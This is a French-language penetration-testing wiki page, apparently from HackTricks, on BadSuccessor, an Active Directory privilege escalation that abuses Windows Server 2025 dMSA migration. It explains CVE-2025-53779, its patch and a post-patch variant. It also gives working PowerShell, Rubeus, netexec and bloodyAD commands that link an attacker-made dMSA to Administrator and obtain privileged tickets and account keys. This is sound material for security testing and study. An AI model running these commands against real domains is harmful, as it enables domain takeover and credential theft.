# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Aperçu

**BadSuccessor** abuse du workflow de migration des **Managed Service Account délégués** (**dMSA**), introduit dans **Windows Server 2025**. Un dMSA peut être lié à un compte hérité via **`msDS-ManagedAccountPrecededByLink`** et passer par les états de migration stockés dans **`msDS-DelegatedMSAState`**. Si un attaquant peut créer un dMSA dans une OU modifiable et contrôler ces attributs, le KDC peut émettre des tickets pour le dMSA contrôlé par l’attaquant avec le **contexte d’autorisation du compte lié**.<sup>[[2]](#references)</sup>

En pratique, cela signifie qu’un utilisateur disposant de faibles privilèges, mais ayant des droits délégués sur une OU, peut créer un nouveau dMSA, le lier à `Administrator`, terminer la migration et obtenir un TGT dont le PAC contient des groupes privilégiés tels que **Domain Admins**.<sup>[[2]](#references)</sup>

## Détails de la migration dMSA à connaître

- dMSA est une fonctionnalité de **Windows Server 2025**.
- `Start-ADServiceAccountMigration` définit l’état de migration sur **started**.
- `Complete-ADServiceAccountMigration` définit l’état de migration sur **completed**.
- `msDS-DelegatedMSAState = 1` signifie que la migration a démarré.
- `msDS-DelegatedMSAState = 2` signifie que la migration est terminée.
- Lors d’une migration légitime, le dMSA est censé remplacer en toute transparence le compte remplacé ; le KDC/LSA préserve donc les accès dont disposait déjà l’ancien compte.<sup>[[3]](#references)</sup>

Microsoft Learn précise également que, pendant la migration, le compte d’origine est lié au dMSA et que celui-ci est censé accéder aux mêmes ressources que l’ancien compte.<sup>[[3]](#references)</sup> C’est cette hypothèse de sécurité qu’exploite BadSuccessor.<sup>[[2]](#references)</sup>

## Prérequis

1. Un domaine où **dMSA existe**, ce qui implique que la prise en charge de **Windows Server 2025** est présente côté AD.
2. L’attaquant peut **créer** des objets `msDS-DelegatedManagedServiceAccount` dans une OU, ou dispose de droits équivalents étendus pour y créer des objets enfants.
3. L’attaquant peut **écrire** les attributs dMSA concernés ou contrôle entièrement le dMSA qu’il vient de créer.
4. L’attaquant peut demander des tickets Kerberos depuis un contexte joint au domaine ou via un tunnel permettant d’atteindre LDAP/Kerberos.<sup>[[2]](#references)</sup>

### Vérifications pratiques

Le signal le plus clair pour l’opérateur consiste à vérifier le niveau du domaine/de la forêt et à confirmer que l’environnement utilise déjà la nouvelle pile Server 2025 :

```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```

Si vous voyez des valeurs telles que `Windows2025Domain` et `Windows2025Forest`, vérifiez en priorité **BadSuccessor / dMSA migration abuse**.

Vous pouvez également énumérer les OU accessibles en écriture et déléguées pour la création de dMSA à l’aide d’outils publics :<sup>[[1]](#references)</sup>

```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```

## Déroulement de l’exploitation

1. Créez un dMSA dans une OU où vous disposez de droits délégués de création d’objets enfants.
2. Définissez **`msDS-ManagedAccountPrecededByLink`** sur le DN d’une cible privilégiée, telle que `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Définissez **`msDS-DelegatedMSAState`** sur `2` pour marquer la migration comme terminée.
4. Demandez un TGT pour le nouveau dMSA et utilisez le ticket obtenu pour accéder aux services privilégiés.<sup>[[2]](#references)</sup>

Exemple PowerShell :<sup>[[2]](#references)</sup>

```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
    msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

Exemples de demandes de ticket / d’outils opérationnels :<sup>[[1]](#references)[[2]](#references)</sup>

```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```

## Pourquoi cela va au-delà de l’élévation de privilèges

Lors d’une migration légitime, Windows doit également permettre au nouveau dMSA de gérer les tickets émis pour le compte précédent avant la bascule. C’est pourquoi les éléments de ticket liés au dMSA peuvent inclure des clés **actuelles** et **précédentes** dans le flux **`KERB-DMSA-KEY-PACKAGE`**.<sup>[[2]](#references)</sup>

Dans le cadre d’une fausse migration contrôlée par un attaquant, ce comportement peut transformer BadSuccessor en :<sup>[[2]](#references)</sup>

- **Élévation de privilèges** par héritage des SID de groupes privilégiés dans le PAC.
- **Exposition d’éléments d’identification**, car la gestion des clés précédentes peut exposer des éléments équivalents au hash RC4/NT du compte prédécesseur dans des workflows vulnérables.

Cette technique est donc utile aussi bien pour prendre directement le contrôle du domaine que pour des opérations ultérieures, comme pass-the-hash ou une compromission plus large des identifiants.

## BetterSuccessor après le correctif du KDC

Le KDC corrigé valide les deux côtés d’une migration dMSA. Outre `msDS-ManagedAccountPrecededByLink` et l’état de migration du dMSA, le prédécesseur doit pointer en retour vers le dMSA via `msDS-SupersededManagedAccountLink` et avoir un `msDS-SupersededServiceAccountState` compatible. Un lien à sens unique échoue désormais ; un compte qui peut uniquement créer un dMSA ne peut pas désigner n’importe quel prédécesseur. Avec `CreateChild` pour un dMSA dans une OU **et** un accès effectif en écriture aux attributs de migration du compte cible sélectionné, un attaquant peut établir le lien réciproque. Le ticket dMSA obtenu peut contenir le contexte d’autorisation du prédécesseur et exposer ses clés dans le package de clés dMSA. Il s’agit d’une voie ciblée d’accès aux identifiants et d’amplification des privilèges, et non d’une preuve que le BadSuccessor d’origine, qui ciblait arbitrairement un compte, reste exploitable sur les DC corrigés.<sup>[[5]](#references)[[6]](#references)</sup>

Dans un lab où l’accès en écriture au compte cible est confirmé, `bloodyAD` peut créer le dMSA et effectuer les écritures de migration associées. Demandez le ticket dMSA à l’aide des éléments Kerberos retournés et vérifiez les permissions réelles du compte cible avant de supposer que ses privilèges ou son hash ont été récupérés. Le nom de la sous-commande `badSuccessor` de l’outil ne signifie pas que le comportement non corrigé à lien unidirectionnel est utilisé.<sup>[[7]](#references)</sup>

```bash
KRB5CCNAME=operator.ccache bloodyAD -d example.local --host dc.example.local -k add badSuccessor test_dmsa --ou 'OU=DMSAHolder,DC=example,DC=local' -t 'CN=Target User,OU=Users,DC=example,DC=local'
```

## Notes sur l’état des correctifs

Le comportement original de BadSuccessor **n’est pas qu’un problème théorique lié à une preview de 2025**. Microsoft lui a attribué le **CVE-2025-53779** et a publié une mise à jour de sécurité en **août 2025**.<sup>[[4]](#references)</sup> Conservez cette attaque dans la documentation pour :

- **les labs / CTFs / exercices assume-breach**
- **les environnements Windows Server 2025 non corrigés**
- **la validation des délégations d’OU et de l’exposition aux dMSA pendant les évaluations**

Ne supposez pas qu’un domaine Windows Server 2025 est vulnérable simplement parce que dMSA existe ; vérifiez le niveau de correctifs et testez avec prudence.

## Outils

- [Outils Akamai BadSuccessor](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [Module `badsuccessor` de NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [1] [HTB: Eighteen - Abus de dMSA via BadSuccessor pour obtenir Domain Admin (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor : abuser de dMSA pour élever ses privilèges dans Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - Présentation des comptes de service gérés délégués](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
- [5] [Akamai - BadSuccessor est mort, vive BadSuccessor (?) ](https://www.akamai.com/blog/security-research/badsuccessor-is-dead-analyzing-badsuccessor-patch)
- [6] [Altered Security - BetterSuccessor : continuer à abuser de dMSA après le correctif](https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch)
- [7] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../../banners/hacktricks-training.md}}
